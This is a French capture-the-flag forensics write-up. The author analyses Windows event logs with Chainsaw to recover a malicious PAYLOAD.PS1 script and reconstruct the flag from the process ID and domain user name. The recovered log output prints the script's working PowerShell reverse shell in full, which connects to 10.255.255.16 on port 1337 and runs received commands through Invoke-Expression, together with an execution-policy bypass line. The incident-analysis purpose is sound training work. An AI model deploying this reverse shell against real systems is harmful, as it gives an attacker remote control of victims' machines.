> Un autre utilisateur a un comportement similaire à La gazette de Windows (catégorie intro). Mais cette fois, pour retrouver ce qui a été envoyé à l'attaquant il faudra peut-être plus de logs.

1. 
```
./chainsaw/chainsaw_x86_64-unknown-linux-gnu hunt -r chainsaw/rules logs -s chainsaw/sigma/rules --mapping chainsaw/mappings/sigma-event-logs-all.yml
```
En faisant un grep de powershell sur cette commande on remarque l'exécution du script PAYLOAD.PS1

En va grep avec PAYLOAD.PS1, on voit une connexion effectué sur le port 1337 je vais filtrer dessus

```
./chainsaw/chainsaw_x86_64-unknown-linux-gnu hunt -r chainsaw/rules logs -s chainsaw/sigma/rules --mapping chainsaw/mappings/sigma-event-logs-all.yml | grep '1337' -C 50

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading detection rules from: chainsaw/rules, chainsaw/sigma/rules
[+] Loaded 2499 detection rules (199 not loaded)
[+] Loading forensic artefacts from: logs (extensions: .evt, .evtx)
[+] Loaded 2 forensic artefacts (10.6 MB)
[+] Hunting: [========================================] 2/2                     │                     │                                │       │                                │          │           │                         │ 96838-1318123174-2233927406-11   │
│                     │                                │       │                                │          │           │                         │ 07                               │
│                     │                                │       │                                │          │           │                         │ TargetDomainName: '-'            │
│                     │                                │       │                                │          │           │                         │ TargetLogonId: '0x0'             │
│                     │                                │       │                                │          │           │                         │ TargetUserName: '-'              │
│                     │                                │       │                                │          │           │                         │ TargetUserSid: S-1-0-0           │
│                     │                                │       │                                │          │           │                         │ TokenElevationType: '%%1936'     │
├─────────────────────┼────────────────────────────────┼───────┼────────────────────────────────┼──────────┼───────────┼─────────────────────────┼──────────────────────────────────┤
│ 2023-04-02 14:26:51 │ ‣ Change PowerShell Policies   │ 1     │ Microsoft-Windows-PowerShell   │ 4104     │ 1467      │ DESKTOP-AL3DV8F.fcsc.fr │ MessageNumber: 1                 │
│                     │ to an Insecure Level           │       │                                │          │           │                         │ MessageTotal: 1                  │
│                     │ - PowerShell                   │       │                                │          │           │                         │ Path: ''                         │
│                     │                                │       │                                │          │           │                         │ ScriptBlockId: fab1cf7c-71d9-4   │
│                     │                                │       │                                │          │           │                         │ 0fc-8f4d-6440a06f856f            │
│                     │                                │       │                                │          │           │                         │ ScriptBlockText: if((Get-Execu   │
│                     │                                │       │                                │          │           │                         │ tionPolicy ) -ne 'AllSigned')    │
│                     │                                │       │                                │          │           │                         │ { Set-ExecutionPolicy -Scope P   │
│                     │                                │       │                                │          │           │                         │ rocess Bypass }; & 'D:\PAYLOAD   │
│                     │                                │       │                                │          │           │                         │ .PS1'                            │
├─────────────────────┼────────────────────────────────┼───────┼────────────────────────────────┼──────────┼───────────┼─────────────────────────┼──────────────────────────────────┤
│ 2023-04-02 14:26:51 │ ‣ Potential Defense Evasion    │ 1     │ Microsoft-Windows-Security-Aud │ 4663     │ 59782     │ DESKTOP-AL3DV8F.fcsc.fr │ AccessList: "%%4416\r            │
│                     │ Via Raw Disk Access By         │       │ iting                          │          │           │                         │ \t\t\t\                          │
│                     │ Uncommon Tools                 │       │                                │          │           │                         │ t"                               │
│                     │                                │       │                                │          │           │                         │ AccessMask: '0x1'                │
│                     │                                │       │                                │          │           │                         │ HandleId: '0x978'                │
│                     │                                │       │                                │          │           │                         │ ObjectName: D:\PAYLOAD.PS1       │
│                     │                                │       │                                │          │           │                         │ ObjectServer: Security           │
│                     │                                │       │                                │          │           │                         │ ObjectType: File                 │
│                     │                                │       │                                │          │           │                         │ ProcessId: '0xecc'               │
│                     │                                │       │                                │          │           │                         │ ProcessName: C:\Windows\System   │
│                     │                                │       │                                │          │           │                         │ 32\WindowsPowerShell\v1.0\powe   │
│                     │                                │       │                                │          │           │                         │ rshell.exe                       │
│                     │                                │       │                                │          │           │                         │ ResourceAttributes: ''           │
│                     │                                │       │                                │          │           │                         │ SubjectDomainName: FCSC          │
│                     │                                │       │                                │          │           │                         │ SubjectLogonId: '0x647ad'        │
│                     │                                │       │                                │          │           │                         │ SubjectUserName: cmaltese        │
│                     │                                │       │                                │          │           │                         │ SubjectUserSid: S-1-5-21-37277   │
│                     │                                │       │                                │          │           │                         │ 96838-1318123174-2233927406-11   │
│                     │                                │       │                                │          │           │                         │ 07                               │
├─────────────────────┼────────────────────────────────┼───────┼────────────────────────────────┼──────────┼───────────┼─────────────────────────┼──────────────────────────────────┤
│ 2023-04-02 14:26:51 │ ‣ Suspicious PowerShell        │ 1     │ Microsoft-Windows-PowerShell   │ 4104     │ 1468      │ DESKTOP-AL3DV8F.fcsc.fr │ MessageNumber: 1                 │
│                     │ Get Current User               │       │                                │          │           │                         │ MessageTotal: 1                  │
│                     │ ‣ Suspicious Process Discovery │       │                                │          │           │                         │ Path: D:\PAYLOAD.PS1             │
│                     │ With Get-Process               │       │                                │          │           │                         │ ScriptBlockId: 2354b750-2422-4   │
│                     │                                │       │                                │          │           │                         │ 2a3-b8c2-4fd7fd36dfe7            │
│                     │                                │       │                                │          │           │                         │ ScriptBlockText: |               │
│                     │                                │       │                                │          │           │                         │  do {                            │
│                     │                                │       │                                │          │           │                         │    Start-Sleep -Seconds 1        │
│                     │                                │       │                                │          │           │                         │     try{                         │
│                     │                                │       │                                │          │           │                         │      $TCPClient = New-Object N   │
│                     │                                │       │                                │          │           │                         │ et.Sockets.TCPClient('10.255.2   │
│                     │                                │       │                                │          │           │                         │ 55.16', 1337)                    │
│                     │                                │       │                                │          │           │                         │    } catch {}                    │
│                     │                                │       │                                │          │           │                         │  } until ($TCPClient.Connected   │
│                     │                                │       │                                │          │           │                         │ )                                │
│                     │                                │       │                                │          │           │                         │  $NetworkStream = $TCPClient.G   │
│                     │                                │       │                                │          │           │                         │ etStream()                       │
│                     │                                │       │                                │          │           │                         │  $StreamWriter = New-Object IO   │
│                     │                                │       │                                │          │           │                         │ .StreamWriter($NetworkStream)    │
│                     │                                │       │                                │          │           │                         │  function WriteToStream ($Stri   │
│                     │                                │       │                                │          │           │                         │ ng) {                            │
│                     │                                │       │                                │          │           │                         │    [byte[]]$script:Buffer = 0.   │
│                     │                                │       │                                │          │           │                         │ .$TCPClient.ReceiveBufferSize    │
│                     │                                │       │                                │          │           │                         │ | % {0}                          │
│                     │                                │       │                                │          │           │                         │    $StreamWriter.Write($String   │
│                     │                                │       │                                │          │           │                         │  + 'SHELL> ')                    │
│                     │                                │       │                                │          │           │                         │    $StreamWriter.Flush()         │
│                     │                                │       │                                │          │           │                         │  }                               │
│                     │                                │       │                                │          │           │                         │  WriteToStream "FCSC{$(([Syste   │
│                     │                                │       │                                │          │           │                         │ m.BitConverter]::ToString(([Sy   │
│                     │                                │       │                                │          │           │                         │ stem.Security.Cryptography.SHA   │
│                     │                                │       │                                │          │           │                         │ 256]::Create()).ComputeHash(([   │
│                     │                                │       │                                │          │           │                         │ System.Text.Encoding]::UTF8.Ge   │
│                     │                                │       │                                │          │           │                         │ tBytes(((Get-Process -Id $PID)   │
│                     │                                │       │                                │          │           │                         │ .Id.ToString()+[System.Securit   │
│                     │                                │       │                                │          │           │                         │ y.Principal.WindowsIdentity]::   │
│                     │                                │       │                                │          │           │                         │ GetCurrent().Name).ToString())   │
│                     │                                │       │                                │          │           │                         │ )))).Replace('-', '').ToLower(   │
│                     │                                │       │                                │          │           │                         │ ))}`n"                           │
│                     │                                │       │                                │          │           │                         │  while(($BytesRead = $NetworkS   │
│                     │                                │       │                                │          │           │                         │ tream.Read($Buffer, 0, $Buffer   │
│                     │                                │       │                                │          │           │                         │ .Length)) -gt 0) {               │
│                     │                                │       │                                │          │           │                         │    $Command = ([text.encoding]   │
│                     │                                │       │                                │          │           │                         │ ::UTF8).GetString($Buffer, 0,    │
│                     │                                │       │                                │          │           │                         │ $BytesRead - 1)                  │
│                     │                                │       │                                │          │           │                         │    $Output = try {               │
│                     │                                │       │                                │          │           │                         │        Invoke-Expression $Comm   │
│                     │                                │       │                                │          │           │                         │ and 2>&1 | Out-String            │
│                     │                                │       │                                │          │           │                         │      } catch {                   │
│                     │                                │       │                                │          │           │                         │        $_ | Out-String           │
│                     │                                │       │                                │          │           │                         │      }                           │
│                     │                                │       │                                │          │           │                         │    WriteToStream ($Output)       │
│                     │                                │       │                                │          │           │                         │  }                               │
│                     │                                │       │                                │          │           │                         │  $StreamWriter.Close()           │
├─────────────────────┼────────────────────────────────┼───────┼────────────────────────────────┼──────────┼───────────┼─────────────────────────┼──────────────────────────────────┤
│ 2023-04-02 14:26:51 │ ‣ Potential Defense Evasion    │ 1     │ Microsoft-Windows-Security-Aud │ 4663     │ 59783     │ DESKTOP-AL3DV8F.fcsc.fr │ AccessList: "%%4416\r            │
│                     │ Via Raw Disk Access By         │       │ iting                          │          │           │                         │ \t\t\t\                          │
│                     │ Uncommon Tools                 │       │                                │          │           │                         │ t"                               │
│                     │                                │       │                                │          │           │                         │ AccessMask: '0x1'                │
│                     │                                │       │                                │          │           │                         │ HandleId: '0xedc'                │
│                     │                                │       │                                │          │           │                         │ ObjectName: D:\PAYLOAD.PS1       │
│                     │                                │       │                                │          │           │                         │ ObjectServer: Security           │

```

Code intéressant :
```
"FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n"
```

[System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString() = PID, seul PID lié à PAYLOAD.PS1 = 0xecc = 3788
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString() = (computername|domaine)\username = FCSC\cmaltese = pas computername mais domaine
.Replace('-', '') = 3788FCSC\cmaltese

